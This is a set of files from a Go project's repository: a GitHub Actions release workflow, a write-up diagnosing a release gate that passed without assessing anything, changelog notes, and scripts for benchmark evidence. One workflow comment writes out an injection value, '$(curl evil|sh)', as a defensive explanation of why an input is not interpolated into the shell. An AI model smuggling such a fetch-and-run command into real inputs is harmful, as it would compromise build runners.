name: release

on:
  workflow_dispatch:
    inputs:
      version:
        description: "Version to release (e.g. v0.1.0). Defaults to the pushed tag."
        required: false
        type: string
  pull_request:
    paths:
      - .github/workflows/release.yml
  push:
    tags:
      - "v*"

permissions:
  contents: read

# A tag push and a nightly dispatch can target the same version. Serialize them
# so the second completes the existing release in place instead of racing it.
concurrency:
  # Key on the version being released, not on ref_name: for a tag push
  # ref_name is the tag, but for a dispatch it is the branch, so the two runs
  # this is meant to serialize would land in different groups and race to
  # create the same release.
  group: release-${{ inputs.version || github.ref_name }}
  cancel-in-progress: false

jobs:
  build:
    name: build
    runs-on: ubuntu-24.04
    outputs:
      bare: ${{ steps.v.outputs.bare }}
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false

      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.
        with:
          go-version: "1.27.x"

      # Brain is pure Go: modernc sqlite is the only driver (the brain_cgo
      # variant was removed with semantic retrieval, trail #278). Every target
      # cross-compiles from one runner, and released binaries need no C
      # toolchain on the user's machine. This guard keeps it that way.
      - name: Verify the default build needs no cgo
        run: |
          set -euo pipefail
          CGO_ENABLED=0 go build -o /dev/null ./cmd/entire-brain
          echo "default build is pure Go"

      - name: Resolve version
        id: v
        env:
          # Never interpolate a workflow input straight into a run: block. The
          # expression is substituted as text before the shell parses it, so a
          # dispatch value like $(curl evil|sh) would execute on the runner.
          VERSION_INPUT: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
            version="${GITHUB_REF_NAME}"
          elif [[ -n "${VERSION_INPUT}" ]]; then
            version="${VERSION_INPUT}"
          else
            version="v0.0.0-dev.$(git rev-parse --short HEAD)"
          fi
          # A version reaches tag names, file names and release titles. Pin its
          # shape rather than trusting whatever was dispatched.
          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
            echo "::error::refusing to build an unrecognised version: ${version}"
            exit 1
          fi
          echo "version=${version}" >> "$GITHUB_OUTPUT"
          echo "bare=${version#v}" >> "$GITHUB_OUTPUT"
          echo "building ${version}"

      - name: Build every target
        env:
          VERSION: ${{ steps.v.outputs.version }}
          BARE: ${{ steps.v.outputs.bare }}
        run: |
          set -euo pipefail
          mkdir -p dist
          targets="linux/amd64 linux/arm64 darwin/amd64 darwin/arm64 windows/amd64 windows/arm64"
          for t in $targets; do
            goos="${t%/*}"; goarch="${t#*/}"
            out="entire-brain"
            [[ "$goos" == windows ]] && out="entire-brain.exe"
            echo "==> $goos/$goarch"
            CGO_ENABLED=0 GOOS="$goos" GOARCH="$goarch" \
              go build -trimpath -ldflags "-s -w -X main.version=${BARE}" \
              -o "dist/$out" ./cmd/entire-brain
            asset="entire-brain_${BARE}_${goos}_${goarch}"
            if [[ "$goos" == windows ]]; then
              (cd dist && zip -q "${asset}.zip" "$out" && rm "$out")
            else
              (cd dist && tar -czf "${asset}.tar.gz" "$out" && rm "$out")
            fi
          done
          (cd dist && sha256sum * > checksums.txt)
          ls -la dist

      - uses: actions/upload-artifact@v7
        with:
          name: release-dist
          path: dist/
          retention-days: 7

  # Cross-compiling from one runner means nothing on the release path ever
  # executes a Windows binary, and test.yml's Windows suite runs CGO_ENABLED=1
  # for the race detector — not the pure-Go configuration that ships. This job
  # tests that shipped configuration and smoke-runs the exact windows/amd64
  # artifact the release will carry. publish requires it, so a release cannot
  # ship untested Windows binaries. windows/arm64 is still only cross-compiled:
  # no amd64 runner can execute it.
  windows-verify:
    name: verify windows
    needs: build
    # Depot, like every other Windows job in this repo: hosted windows-latest
    # is 2-core for private repos and could not finish internal/cli (1,700+
    # test roots in one binary) inside 50 minutes. This does put a Depot
    # dependency on the publish path; during a Depot outage, releases wait.
    runs-on: depot-windows-2025-8
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false

      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.
        with:
          go-version: "1.27.x"

      - name: Test the shipped pure-Go configuration
        shell: pwsh
        env:
          CGO_ENABLED: "0"
        run: |
          $ErrorActionPreference = 'Stop'
          # internal/cli runs as a precompiled binary we own, not under go test:
          # its tests re-exec os.Executable() to spawn detached workers, and a
          # worker outliving the suite keeps cli.test.exe mapped on Windows, so
          # go test's own temp cleanup fails the run with "unlinkat: Access is
          # denied" after every test passed. The per-PR Windows harness runs the
          # compiled binary directly for the same reason. The runner is
          # ephemeral, so nobody needs to delete our copy.
          $pkgs = (go list ./...) | Where-Object { $_ -notmatch '/internal/cli$' }
          go test -timeout 20m $pkgs
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          go test -c -o "$env:RUNNER_TEMP/cli.test.exe" ./internal/cli
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          Push-Location internal/cli
          # Quoted and =-joined: pwsh splits a bare -test.timeout=25m at the dot,
          # and a space-separated value leaks into os.Args as a positional that at
          # least one test (parsing os.Args through cobra) trips over.
          & "$env:RUNNER_TEMP/cli.test.exe" '-test.timeout=25m'
          $code = $LASTEXITCODE
          Pop-Location
          exit $code

      - uses: actions/download-artifact@v8
        with:
          name: release-dist
          path: dist

      - name: Smoke-run the released windows/amd64 binary
        shell: pwsh
        env:
          BARE: ${{ needs.build.outputs.bare }}
        run: |
          $ErrorActionPreference = 'Stop'
          Expand-Archive -LiteralPath "dist/entire-brain_${env:BARE}_windows_amd64.zip" -DestinationPath "$env:RUNNER_TEMP/release-windows"
          tools/windows-sanity.ps1 -Binary "$env:RUNNER_TEMP/release-windows/entire-brain.exe"

  publish:
    name: publish
    needs: [build, windows-verify]
    # Only a real tag publishes. A pull_request run proves the build still works
    # without creating a release.
    if: github.event_name != 'pull_request'
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false

      - uses: actions/download-artifact@v8
        with:
          name: release-dist
          path: dist

      - name: Create or update the release
        env:
          GH_TOKEN: ${{ github.token }}
          VERSION_INPUT: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
            version="${GITHUB_REF_NAME}"
          else
            version="${VERSION_INPUT}"
          fi
          [[ -n "$version" ]] || { echo "no version to publish" >&2; exit 1; }
          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
            echo "::error::refusing to publish an unrecognised version: ${version}"
            exit 1
          fi

          mapfile -t assets < <(find dist -type f | sort)
          if gh release view "$version" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
            echo "release $version exists — updating assets in place"
            gh release upload "$version" "${assets[@]}" --clobber --repo "$GITHUB_REPOSITORY"
          else
            gh release create "$version" "${assets[@]}" \
              --repo "$GITHUB_REPOSITORY" \
              --title "$version" \
              --generate-notes
          fi

**Solved — the full story, verified end to end.**

## What the issue is

Three latent defects stack:

1. **Setup dirties the tree it then grades.** `entire-brain setup` writes `AGENTS.md`, `CLAUDE.md`, and a PreToolUse hook into `.claude/settings.json` (`internal/cli/agent_wiring.go:79`). The live-state dirty check exempts only brain-ignored paths (`agent_surface.go:4940`), so those files make the seed axis `dirty-unindexed` and retrieval freshness `degraded`. This has been true since wiring moved into setup (Oct 11) — **including during the green runs**.

2. **The gate passes vacuously without the graph provider.** `brainStatusFreshnessSeverity` (`agent_surface.go:1197`) returns `""` when `report.Semantic.Freshness` is nil — and retrieval freshness is never consulted. So with no graph installed, `status --fail-on degraded` passes even though freshness is degraded. The code's own comment says the opposite ("a release gate cannot pass unless semantic indexing produced a freshness assessment"), so this is arguably its own bug.

3. **The smoke's isolation doesn't isolate the graph provider.** The brain reaches graph through the host CLI (`entire graph …`), which resolves the plugin from the real install — `ENTIRE_PLUGIN_*_DIR` doesn't cover it.

## When and why it flipped

The Oct 22 green runs (21:33–23:13 local, per the session transcript) printed `"semantic search unavailable — run entire plugin install graph"` in leg 1 — no graph on the machine, so defect 2 masked defect 1. **entire-graph v0.5.0 was installed at Oct 23 01:53** (plugin symlink timestamps), during the release wrap-up. From then on, semantic freshness exists, `worseFreshnessSeverity` merges the retrieval `degraded` in, and the gate trips.

Verified with a binary matrix: the last green RC (cb29e4c3), v0.2.0, and HEAD **all fail** with graph visible and **all pass** with graph hidden (shimmed `entire` failing the `graph` subcommand reproduces the Oct 22 console output byte-for-byte). No brain code change is involved.

## Implications

- Not a regression in the release candidate — safe to fix without suspecting recent merges.
- But real first-runs on machines **with** graph installed currently end on `freshness: degraded`, so defect 1 is worth fixing regardless: exempt setup-authored wiring files from the dirty computation (same membership rule as PR #482).
- Defect 2 deserves a decision: the gate silently weakening when graph is absent means the Oct 22 "7/7 PASS" was partially vacuous.
- Cheapest smoke unblock (verified): commit setup's wiring output in leg 1 before the status assert.

## [Unreleased]

### Removed

- The one-time migrations for Brain's old code stores. Refresh, code inspection,
  and bundle operations now refuse old layouts with recovery instructions;
  status and doctor report the same problem. Run `entire brain refresh index`
  with entire-brain 0.2.0 once before upgrading to preserve runtime traces, or
  back up and remove the brain directory and refresh to rebuild. Legacy vector
  detection remains in place for health and privacy checks.

### Fixed

- A first `setup` no longer ends on `freshness: degraded`. The agent wiring
  files setup itself writes — `AGENTS.md`, `CLAUDE.md`, and the PreToolUse
  entry in `.claude/settings.json` — no longer count as a dirty worktree in the
  live state report, the same exemption the dirty-worktree gate already
  applied. The files stay in the indexed corpus.

- `status --fail-on degraded` and `--fail-on unsafe` no longer pass without
  looking when the brain has no semantic assessment: a degraded or unsafe
  retrieval freshness now trips the gate even when no graph provider is
  installed. A healthy retrieval report still does not substitute for the
  missing assessment, so `--fail-on release` keeps failing on unindexed brains.

- `mise run release:smoke` leg 1 gates on `--fail-on release` instead of
  `--fail-on degraded`, so a runner without the entire-graph provider fails
  loudly ("freshness is unset") instead of passing a gate that assessed
  nothing — which is how the gate silently weakened on machines without the
  provider.

The failure hid because `status --fail-on degraded` passed without
looking whenever no semantic assessment existed: a missing assessment
yielded severity "" and the retrieval severity was discarded with it,
so a brain without a graph provider had no freshness gating at all.
The release smoke validated v0.2.0 exactly that way — no provider on
the runner, leg 1 green over a tree whose seed had refused to build.
Installing the provider later turned the same tree red at leg 1.
brainStatusFreshnessSeverity now surfaces a degraded or unsafe
retrieval severity even without a semantic assessment; a healthy
retrieval report still never substitutes for the missing assessment,
so --fail-on release keeps failing on unindexed brains.

# Distill Performance Evidence

This directory contains retained `entire brain distill` performance artifacts.
The current retained manifest is scoped to this repository and a deterministic
local command agent. It proves the local extraction scheduler and evidence gate:
`--jobs 4` preserves the same output summary as `--jobs 1` while improving the
measured extraction-heavy wall time on a temporary copy of the current
`entire-brain` local brain.

Evidence must be collected on the repo whose performance claim it supports, or
the release copy must scope the claim to the measured repo. The committed
current-repo artifacts must not be reused to support a frontend/entire.io 24h
distill claim. That claim still needs retained dry-run and timed artifacts from
the target large session repo.

A release-citable `manifest.json` in this directory must name:

- `target.repo`, `target.repo_key`, `target.source_head`,
  `target.brain_manifest_sha256`, and `target.claim_scope`, so the measured repo
  and the release claim it supports are explicit and audit-visible;
- one `entire brain distill --dry-run --json` artifact captured before the timed
  runs;
- one serial timed `entire brain distill --json --jobs 1` artifact;
- one parallel timed `entire brain distill --json --jobs N` artifact from the
  same target repo/cache state, same agent/model/effort, same branch/force/
  max-chunk-bytes settings, and zero failed chunks;
- `artifact_sha256` entries for the three retained JSON artifacts;
- `commands` arrays with the exact retained command tokens for dry-run, serial,
  and parallel runs. Use an explicit `--agent`; do not rely on `auto`. Include
  the chosen `--max-chunk-bytes` so the chunking/call-count tradeoff is
  inspectable;
- `local_ollama_contract`, a retained non-cached `go test -json` artifact proving
  the fake loopback Ollama distill path sends the selected model to
  `/api/generate`, avoids the `ollama` PATH binary, and rejects non-loopback or
  redirected egress without requiring a real external model. This section must
  include the artifact hash, exact command, source head, source path list, and
  required test names;
- a `min_speedup` threshold greater than `1.0`.

For current retained evidence, `claim_scope` is intentionally narrow:
`current-repo local command-agent distill extraction scheduling speedup`. The
local command agent is committed as `local-command-agent.py`; it exercises
extraction, reconciliation, deterministic writes, and timing evidence without a
hosted model or network. It does not validate fact quality or hosted-model
latency. The retained `go-test-internal-cli-ollama-distill.jsonl` artifact is a
separate local-model contract proof: it exercises fake loopback Ollama with
`-count=1`, but it is not evidence that any specific Ollama model produces good
facts.

The retained timed pair is the MEDIAN of five back-to-back `--jobs 1`/`--jobs 4`
pairs collected on one machine, chosen by that rule before the runs were read.
The five spanned 2.5747x-2.6284x (median 2.5934x, stdev 0.026) against the
`min_speedup` floor of 1.25.

Run `mise run distill:evidence` after committing artifacts. The validator fails
if artifact hashes or command provenance do not match, the dry-run has missing
transcripts or warnings, branch totals do not add up, run configs differ,
cache-hit counts do not match, warnings or failed chunks are present,
serial/parallel output summaries differ, reconcile calls exceed the dry-run
upper bound, timing components exceed `total_seconds`, the parallel run uses
only one effective job, the retained command omits the artifact's
`max_chunk_bytes`, the retained fake-Ollama contract artifact is missing/stale or
lacks a required passing test, or the observed `total_seconds` speedup does not
meet the manifest threshold.

#!/bin/bash
# Re-measure the distill-perf (current-repo) evidence lane.
# Methodology mirrors evidence commit c84cfdab: offline runs against APFS
# clones of the live store under isolated ENTIRE_PLUGIN_* roots; every timed
# run starts from a fresh clone of one pristine master snapshot; five
# back-to-back --jobs 1/--jobs 4 pairs; the median pair (by speedup) is
# retained. The live store is never written.
set -euo pipefail

repo_root=$(git rev-parse --show-toplevel)
cd "$repo_root"
out=${OUT_DIR:?export OUT_DIR}
pairs=${PAIRS:-5}
mkdir -p "$out"

bin="$out/entire-brain"
go build -o "$bin" ./cmd/entire-brain

live=$HOME/.local/share/entire/plugins/data/brain/repos/gh/entireio/entire-brain
master="$out/master-store"
rm -rf "$master"
cp -Rc "$live" "$master"
shasum -a 256 "$master/manifest.json" | awk '{print "sha256:"$1}' > "$out/brain-manifest-sha.txt"

agent_py=benchmarks/agent-brain/evidence/distill-perf/local-command-agent.py
iso="$out/iso"

run_distill() { # run_distill <artifact> <jobs> [--dry-run]
  local artifact=$1 jobs=$2 dry=${3:-}
  rm -rf "$iso"
  mkdir -p "$iso/data/repos/gh/entireio" "$iso/state" "$iso/config" "$iso/cache"
  cp -Rc "$master" "$iso/data/repos/gh/entireio/entire-brain"
  # shellcheck disable=SC2086
  env ENTIRE_PLUGIN_DATA_DIR="$iso/data" \
      ENTIRE_PLUGIN_STATE_DIR="$iso/state" \
      ENTIRE_PLUGIN_CONFIG_DIR="$iso/config" \
      ENTIRE_PLUGIN_CACHE_DIR="$iso/cache" \
      ENTIRE_BRAIN_DAEMON_NO_REGISTER=1 \
    "$bin" distill $dry --json --agent command \
      --agent-command python3 --agent-command "$agent_py" \
      --force --max-chunk-bytes 262144 --confidence 0.75 --jobs "$jobs" \
      > "$artifact"
}

echo "== dry-run"
run_distill "$out/dry-run.json" 1 --dry-run

for i in $(seq 1 "$pairs"); do
  echo "== pair $i: jobs 1"
  run_distill "$out/pair$i-jobs-1.json" 1
  echo "== pair $i: jobs 4"
  run_distill "$out/pair$i-jobs-4.json" 4
  python3 - "$out/pair$i-jobs-1.json" "$out/pair$i-jobs-4.json" <<'PY'
import json, sys
s = json.load(open(sys.argv[1])); p = json.load(open(sys.argv[2]))
st = s.get("timing", {}).get("total_seconds") or s.get("total_seconds")
pt = p.get("timing", {}).get("total_seconds") or p.get("total_seconds")
print(f"   serial {st}s parallel {pt}s speedup {st/pt:.4f}x")
PY
done
echo "all pairs done; artifacts in $out"

#!/usr/bin/env python3
"""Retain the median measurement pair and rewrite a distill evidence manifest.

Usage: finalize-distill-manifest.py <lane_dir> <measure_dir> <ollama_jsonl> \
           <target_repo> <target_repo_key> <target_source_head>

Re-measured, not re-pinned: artifacts come from the runs in <measure_dir>;
this script only selects the median pair (by speedup, rule fixed up front),
copies the retained artifacts into the lane, and recomputes every hash the
audit checks. Commands, claim scope, floors, and notes are left as committed.
"""
import hashlib
import json
import pathlib
import shutil
import subprocess
import sys

lane, measure, ollama, repo, repo_key, source_head = sys.argv[1:7]
lane = pathlib.Path(lane)
measure = pathlib.Path(measure)
repo_root = pathlib.Path(
    subprocess.run(["git", "rev-parse", "--show-toplevel"], capture_output=True, text=True, check=True).stdout.strip()
)


def sha(path: pathlib.Path) -> str:
    return "sha256:" + hashlib.sha256(path.read_bytes()).hexdigest()


def total_seconds(path: pathlib.Path) -> float:
    d = json.loads(path.read_text())
    t = d.get("timing", {}).get("total_seconds") or d.get("total_seconds")
    assert isinstance(t, (int, float)) and t > 0, f"no total_seconds in {path}"
    return float(t)


pairs = []
for one in sorted(measure.glob("pair*-jobs-1.json")):
    four = measure / one.name.replace("jobs-1", "jobs-4")
    s, p = total_seconds(one), total_seconds(four)
    pairs.append((s / p, one, four))
pairs.sort(key=lambda x: x[0])
speedups = [f"{x[0]:.4f}x" for x in pairs]
median = pairs[len(pairs) // 2]
print(f"pairs by speedup: {speedups}; retained median {median[0]:.4f}x ({median[1].name})")

shutil.copy(measure / "dry-run.json", lane / "dry-run.json")
shutil.copy(median[1], lane / "jobs-1.json")
shutil.copy(median[2], lane / "jobs-4.json")
shutil.copy(ollama, lane / "go-test-internal-cli-ollama-distill.jsonl")

manifest_path = lane / "manifest.json"
m = json.loads(manifest_path.read_text())
m["target"]["repo"] = repo
m["target"]["repo_key"] = repo_key
m["target"]["source_head"] = source_head
m["target"]["brain_manifest_sha256"] = (measure / "brain-manifest-sha.txt").read_text().strip()
m["artifact_sha256"] = {
    "dry_run": sha(lane / "dry-run.json"),
    "serial_run": sha(lane / "jobs-1.json"),
    "parallel_run": sha(lane / "jobs-4.json"),
}
m["source_sha256"] = {rel: sha(repo_root / rel) for rel in m["source_sha256"]}
m["local_ollama_contract"]["sha256"] = sha(lane / "go-test-internal-cli-ollama-distill.jsonl")
m["local_ollama_contract"]["source_head"] = source_head
if m.get("executed_agent"):
    m["executed_agent"]["sha256"] = sha(repo_root / m["executed_agent"]["path"])
manifest_path.write_text(json.dumps(m, indent=2) + "\n")
print(f"wrote {manifest_path}")
